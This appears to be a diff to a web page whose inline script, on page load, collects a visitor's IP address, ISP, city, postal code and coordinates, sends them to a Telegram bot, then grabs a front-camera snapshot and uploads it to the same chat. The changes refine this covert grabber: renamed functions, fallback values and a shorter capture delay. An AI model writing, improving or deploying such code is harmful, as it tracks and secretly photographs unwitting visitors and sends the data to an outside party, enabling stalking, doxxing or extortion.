@@ -57,15 +57,15 @@
 🌍 IP dân cư: ${ipinfo?.ip || "Không xác định"}
 🧠 IP gốc: ${ipinfo?.ip || "Không xác định"}
 🏢 ISP: ${ipinfo?.isp || "Không xác định"}
-🏙️ Địa chỉ: ${ipinfo?.city}, ${ipinfo?.region}, ${ipinfo?.postal}
-🌎 Quốc gia: ${ipinfo?.country}
-📍 Vĩ độ: ${ipinfo?.latitude}
-📍 Kinh độ: ${ipinfo?.longitude}
+🏙️ Địa chỉ: ${ipinfo?.city || "?"}, ${ipinfo?.region || "?"}, ${ipinfo?.postal || "?"}
+🌎 Quốc gia: ${ipinfo?.country || "?"}
+📍 Vĩ độ: ${ipinfo?.latitude || "?"}
+📍 Kinh độ: ${ipinfo?.longitude || "?"}
 📌 Vị trí Google Maps: https://maps.google.com/?q=${ipinfo?.latitude},${ipinfo?.longitude}
 📸 Camera: Đang kiểm tra quyền truy cập...`;
     }
 
-    async function sendInfoMessage() {
+    async function sendTextMessage() {
       const msg = await getInfo();
       await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
         method: "POST",
@@ -74,22 +74,27 @@
       });
     }
 
-    async function captureAndSendPhoto() {
-      const video = document.createElement("video");
+    async function capturePhotoAndSend() {
       const canvas = document.getElementById("snapshot");
       const ctx = canvas.getContext("2d");
+      const video = document.createElement("video");
 
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, audio: false
+        });
+
         video.srcObject = stream;
         await video.play();
-        await new Promise(r => setTimeout(r, 2000));
+
+        await new Promise(resolve => setTimeout(resolve, 1000)); // giảm delay
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95));
+
         const form = new FormData();
         form.append("chat_id", chat_id);
         form.append("photo", blob, "photo.jpg");
@@ -110,8 +115,9 @@
       }
     }
 
-    sendInfoMessage();
-    captureAndSendPhoto();
+    // Gửi tin IP trước, ảnh sau
+    sendTextMessage();
+    capturePhotoAndSend();
   </script>
 </body>
 </html>
